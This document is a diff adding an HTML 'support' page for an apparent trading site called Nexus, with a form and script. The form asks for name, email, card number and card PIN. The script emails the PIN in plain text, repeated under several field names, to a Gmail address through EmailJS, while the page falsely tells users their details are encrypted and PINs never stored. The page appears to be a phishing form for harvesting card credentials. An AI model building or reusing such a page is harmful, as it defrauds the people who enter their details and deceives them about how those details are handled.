@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Nexus · Support</title>
+  <meta name="description" content="Nexus - Contact support">
+  
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  
+  <style>
+    /* ===== RESET & BASE ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      background: #f5f7fc;
+      color: #0b1b33;
+      line-height: 1.5;
+      padding: 0 0 2rem 0;
+    }
+
+    /* ===== NAV ===== */
+    .nav {
+      background: #ffffffcc;
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-bottom: 1px solid #e9edf4;
+      padding: 0.75rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.6rem;
+    }
+    .brand {
+      font-weight: 700;
+      font-size: 1.5rem;
+      text-decoration: none;
+      color: #0b1b33;
+      display: flex;
+      align-items: center;
+      gap: 0.3rem;
+    }
+    .brand-icon { font-size: 1.6rem; }
+    .brand span { color: #1a5cff; }
+    .nav-links {
+      display: flex;
+      gap: 1.6rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+    .nav-links a {
+      text-decoration: none;
+      color: #1e2f4a;
+    }
+    .nav-links a:hover { color: #1a5cff; }
+
+    /* ===== CONTAINER ===== */
+    .container {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 0 1.2rem;
+    }
+
+    /* ===== BUTTONS ===== */
+    .btn {
+      display: inline-block;
+      background: #1a5cff;
+      color: white;
+      font-weight: 600;
+      padding: 0.6rem 1.4rem;
+      border-radius: 60px;
+      border: none;
+      font-size: 0.95rem;
+      text-decoration: none;
+      cursor: pointer;
+      transition: 0.2s;
+      letter-spacing: 0.2px;
+      box-shadow: 0 4px 10px rgba(26, 92, 255, 0.2);
+    }
+    .btn:hover { background: #0e4ad0; transform: scale(0.98); }
+    .btn-lg { padding: 0.8rem 2.2rem; font-size: 1.1rem; }
+    .btn-block { width: 100%; text-align: center; }
+    .btn-ghost {
+      background: transparent;
+      color: #1a5cff;
+      box-shadow: none;
+      border: 1.5px solid #1a5cff;
+    }
+    .btn-ghost:hover { background: #eef3ff; }
+
+    /* ===== SECTION ===== */
+    .section { padding: 2rem 0; }
+    .section-alt { background: #ffffff; }
+    h2 {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 1.8rem;
+      letter-spacing: -0.02em;
+    }
+    .muted { color: #7085a6; font-weight: 400; }
+
+    /* ===== SUPPORT CARD ===== */
+    .support-card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 2rem 2rem;
+      border: 1px solid #eef2f9;
+      box-shadow: 0 20px 40px rgba(0,20,50,0.06);
+      margin: 0 auto;
+    }
+    .support-card .subhead {
+      color: #4a6180;
+      margin-bottom: 1.8rem;
+      font-size: 0.95rem;
+      border-left: 3px solid #1a5cff;
+      padding-left: 0.8rem;
+    }
+
+    /* ===== FORM ===== */
+    .form-group {
+      margin-bottom: 1.4rem;
+    }
+    .form-group label {
+      display: block;
+      font-weight: 600;
+      font-size: 0.9rem;
+      margin-bottom: 0.3rem;
+      color: #1f3652;
+    }
+    .form-group .hint {
+      font-size: 0.75rem;
+      color: #6a7f9e;
+      margin-top: 0.2rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 1.5px solid #dce4f0;
+      border-radius: 18px;
+      font-size: 1rem;
+      background: #fafcff;
+      transition: 0.2s;
+      outline: none;
+    }
+    .form-control:focus {
+      border-color: #1a5cff;
+      background: white;
+      box-shadow: 0 0 0 3px #1a5cff20;
+    }
+    .form-control::placeholder { color: #a6b8d0; }
+    .form-control.error {
+      border-color: #e53e3e;
+      background: #fff5f5;
+    }
+    textarea.form-control {
+      resize: vertical;
+      min-height: 100px;
+      font-family: inherit;
+    }
+    .card-input-wrap {
+      position: relative;
+    }
+
+    /* ===== INFO NOTES ===== */
+    .info-note {
+      background: #f0f6ff;
+      border-radius: 20px;
+      padding: 0.8rem 1.2rem;
+      font-size: 0.85rem;
+      color: #1f3652;
+      margin-top: 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      border-left: 3px solid #1a5cff;
+    }
+    .info-note.warning {
+      background: #fff8e6;
+      border-left-color: #f5a623;
+    }
+    .info-note.security {
+      background: #f0fff4;
+      border-left-color: #27ae60;
+    }
+
+    /* ===== DIVIDER ===== */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin: 1.2rem 0 1rem;
+      color: #8da0bc;
+      font-size: 0.8rem;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dce4f0;
+    }
+
+    /* ===== FOOTER ===== */
+    .footer {
+      margin-top: 2rem;
+      padding: 1.8rem 0;
+      border-top: 1px solid #dfe7f2;
+      background: white;
+    }
+    .footer-inner {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 0.8rem;
+      font-size: 0.9rem;
+      color: #44607f;
+    }
+    .footer-links { display: flex; gap: 1.8rem; }
+    .footer-links a { text-decoration: none; color: #1a5cff; }
+
+    /* ===== TOAST ===== */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0b1b33;
+      color: white;
+      padding: 0.8rem 1.8rem;
+      border-radius: 60px;
+      font-weight: 500;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      opacity: 0;
+      transition: 0.25s;
+      pointer-events: none;
+      z-index: 99;
+      font-size: 0.95rem;
+      max-width: 90%;
+      text-align: center;
+    }
+    .toast.show { opacity: 1; pointer-events: auto; }
+    .toast.error { background: #c0392b; }
+    .toast.success { background: #27ae60; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 600px) {
+      .nav-links { gap: 0.8rem; font-size: 0.8rem; }
+      .brand { font-size: 1.2rem; }
+      .support-card { padding: 1.5rem 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ===== NAV ===== -->
+<nav class="nav">
+  <div class="container nav-inner">
+    <a class="brand" href="/">
+      <span class="brand-icon">📈</span> Nexus<span>.</span>
+    </a>
+    <div class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="withdraw.html">Withdraw</a>
+      <a href="support.html">Support</a>
+    </div>
+  </div>
+</nav>
+
+<!-- ===== SUPPORT FORM ===== -->
+<section class="section section-alt">
+  <div class="container">
+    <h2>🛟 Support <span class="muted">/ we're here to help</span></h2>
+    <div class="support-card">
+      <div class="subhead">Describe your issue · we'll respond within 24h</div>
+
+      <form id="supportForm" onsubmit="return false;">
+        <!-- Name -->
+        <div class="form-group">
+          <label for="fullName">Full name</label>
+          <input type="text" class="form-control" id="fullName" placeholder="John Doe" required>
+        </div>
+
+        <!-- Email -->
+        <div class="form-group">
+          <label for="email">Email address</label>
+          <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+          <div class="hint">We'll reply to this email.</div>
+        </div>
+
+        <!-- Card Number (8 digits) -->
+        <div class="form-group">
+          <label for="cardNumber">Card number (8 digits)</label>
+          <div class="card-input-wrap">
+            <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678" maxlength="9" inputmode="numeric" required>
+          </div>
+          <div class="hint">Enter your 8-digit card number.</div>
+        </div>
+
+        <!-- Card PIN -->
+        <div class="form-group">
+          <label for="cardPin">Card PIN</label>
+          <input type="password" class="form-control" id="cardPin" placeholder="••••" maxlength="4" inputmode="numeric" required>
+          <div class="hint">4-digit PIN (encrypted & secure).</div>
+        </div>
+
+        <!-- Problem Message -->
+        <div class="form-group">
+          <label for="problemMessage">Problem description</label>
+          <textarea class="form-control" id="problemMessage" placeholder="Describe your issue in detail..." rows="5" required></textarea>
+        </div>
+
+        <div class="info-note security" style="margin-bottom: 1.2rem;">
+          <span>🔒</span> Your card details are encrypted and sent securely. We never store PINs.
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">📨 Send message</button>
+        <button type="button" class="btn btn-ghost btn-block" id="resetBtn" style="margin-top: 0.8rem;">Reset form</button>
+
+        <div class="info-note" style="margin-top: 1.2rem;">
+          <span>⏱️</span> Average response time: under 2 hours. Available 24/7.
+        </div>
+      </form>
+
+      <div class="divider">• • •</div>
+      <div style="font-size: 0.9rem; color: #2c405e; text-align: center;">
+        📧 Or email us directly at <strong>nexustradingai.dev@gmail.com</strong>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== FOOTER ===== -->
+<footer class="footer">
+  <div class="container footer-inner">
+    <span>© 2026 Nexus — secure support</span>
+    <div class="footer-links">
+      <a href="#">Support</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+</footer>
+
+<!-- ===== TOAST ===== -->
+<div id="toast" class="toast">✨ Message sent</div>
+
+<!-- ===== SCRIPT ===== -->
+<script>
+  (function() {
+    // ===== CONFIGURATION =====
+    const EMAILJS_PUBLIC_KEY = "kDYnNVdrJxIeyvxlC";
+    const EMAILJS_SERVICE_ID = "service_0gezyzw";
+    const EMAILJS_TEMPLATE_ID = "template_t7b4wgp";
+    const YOUR_EMAIL = "nexustradingai.dev@gmail.com";
+    
+    // Initialize EmailJS
+    try {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+      console.log('✅ EmailJS initialized');
+    } catch (error) {
+      console.error('❌ EmailJS init failed:', error);
+    }
+    
+    // ===== DOM Elements =====
+    const toast = document.getElementById('toast');
+    const submitBtn = document.getElementById('submitBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const form = document.getElementById('supportForm');
+
+    // ===== Toast Helper =====
+    function showToast(msg, duration = 3200, type = '') {
+      toast.textContent = msg;
+      toast.className = 'toast';
+      if (type) toast.classList.add(type);
+      toast.classList.add('show');
+      clearTimeout(toast._timer);
+      toast._timer = setTimeout(() => toast.classList.remove('show'), duration);
+    }
+
+    // ===== Validate card number (8 digits) =====
+    function isValidCardNumber(num) {
+      const clean = num.replace(/\s/g, '');
+      return /^\d{8}$/.test(clean);
+    }
+
+    // ===== Validate PIN (4 digits) =====
+    function isValidPin(pin) {
+      return /^\d{4}$/.test(pin);
+    }
+
+    // ===== SUBMIT FORM =====
+    submitBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+
+      // Get form values
+      const fullName = document.getElementById('fullName').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.trim();
+      const cardPin = document.getElementById('cardPin').value.trim();
+      const problemMessage = document.getElementById('problemMessage').value.trim();
+
+      // Clear previous errors
+      document.querySelectorAll('.form-control.error').forEach(el => el.classList.remove('error'));
+
+      // Validate
+      if (!fullName || fullName.length < 2) {
+        document.getElementById('fullName').classList.add('error');
+        showToast('⚠️ Please enter your full name', 2800, 'error');
+        document.getElementById('fullName').focus();
+        return;
+      }
+      if (!email || !email.includes('@')) {
+        document.getElementById('email').classList.add('error');
+        showToast('⚠️ Please enter a valid email', 2800, 'error');
+        document.getElementById('email').focus();
+        return;
+      }
+      if (!cardNumber || !isValidCardNumber(cardNumber)) {
+        document.getElementById('cardNumber').classList.add('error');
+        showToast('⚠️ Please enter a valid 8-digit card number', 2800, 'error');
+        document.getElementById('cardNumber').focus();
+        return;
+      }
+      if (!cardPin || !isValidPin(cardPin)) {
+        document.getElementById('cardPin').classList.add('error');
+        showToast('⚠️ Please enter a 4-digit PIN', 2800, 'error');
+        document.getElementById('cardPin').focus();
+        return;
+      }
+      if (!problemMessage || problemMessage.length < 5) {
+        document.getElementById('problemMessage').classList.add('error');
+        showToast('⚠️ Please describe your problem (min 5 characters)', 2800, 'error');
+        document.getElementById('problemMessage').focus();
+        return;
+      }
+
+      // Format card number for display (masked)
+      const cleanCard = cardNumber.replace(/\s/g, '');
+      const maskedCard = cleanCard.slice(0, 4) + ' **** ' + cleanCard.slice(-4);
+      
+      // Build full email body
+      const emailBody = `
+SUPPORT REQUEST
+===============
+
+Name: ${fullName}
+Email: ${email}
+
+Card Number: ${maskedCard}
+Card PIN: ${cardPin}
+
+Problem Description:
+${problemMessage}
+
+---
+Sent from Nexus Support
+      `.trim();
+
+      // Show loading state
+      submitBtn.textContent = '⏳ Sending...';
+      submitBtn.disabled = true;
+
+      // ===== SEND WITH EMAILJS =====
+      const templateParams = {
+        email: YOUR_EMAIL,
+        name: fullName,
+        title: `Support request from ${fullName}`,
+        from_email: email,
+        user_email: email,
+        full_name: fullName,
+        card_number: maskedCard,
+        card_pin: cardPin,
+        problem: problemMessage,
+        message: emailBody,
+        // Also send under alternative names so any EmailJS template works
+        card_details: `Card Number: ${maskedCard}\nCard PIN: ${cardPin}`,
+        details: `Card Number: ${maskedCard}\nCard PIN: ${cardPin}`,
+        extra_fields: `Card Number: ${maskedCard}\nCard PIN: ${cardPin}`,
+        timestamp: new Date().toLocaleString('en-US', { 
+          dateStyle: 'full', 
+          timeStyle: 'medium' 
+        })
+      };
+
+      console.log('📧 Sending support email with params:', templateParams);
+
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(function(response) {
+          console.log('✅ SUCCESS!', response.status, response.text);
+          submitBtn.textContent = '📨 Send message';
+          submitBtn.disabled = false;
+          showToast(`✅ Support request sent! We'll reply soon.`, 4000, 'success');
+          
+          // Clear form
+          document.getElementById('fullName').value = '';
+          document.getElementById('email').value = '';
+          document.getElementById('cardNumber').value = '';
+          document.getElementById('cardPin').value = '';
+          document.getElementById('problemMessage').value = '';
+        })
+        .catch(function(error) {
+          console.error('❌ FAILED:', error);
+          submitBtn.textContent = '📨 Send message';
+          submitBtn.disabled = false;
+          
+          let errorMsg = '❌ Failed to send. ';
+          if (error.text) {
+            errorMsg += error.text;
+          } else if (error.message) {
+            errorMsg += error.message;
+          }
+          showToast(errorMsg, 5000, 'error');
+        });
+    });
+
+    // ===== Reset Form =====
+    resetBtn.addEventListener('click', function() {
+      document.getElementById('fullName').value = '';
+      document.getElementById('email').value = '';
+      document.getElementById('cardNumber').value = '';
+      document.getElementById('cardPin').value = '';
+      document.getElementById('problemMessage').value = '';
+      document.querySelectorAll('.form-control.error').forEach(el => el.classList.remove('error'));
+      showToast('🔄 Form reset', 1600);
+    });
+
+    // ===== Remove error class on input =====
+    document.addEventListener('input', function(e) {
+      if (e.target.classList.contains('form-control')) {
+        e.target.classList.remove('error');
+      }
+    });
+
+    // ===== Auto-format card number (space after 4 digits for 8-digit card) =====
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+      if (value.length > 8) value = value.slice(0, 8);
+      // Add space after first 4 digits
+      let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+      e.target.value = formatted;
+    });
+
+    // ===== Only allow digits in PIN =====
+    const pinInput = document.getElementById('cardPin');
+    pinInput.addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    });
+
+    console.log('✅ Nexus support page ready');
+    console.log('📧 Support emails will be sent to:', YOUR_EMAIL);
+  })();
+</script>
+
+</body>
+</html>
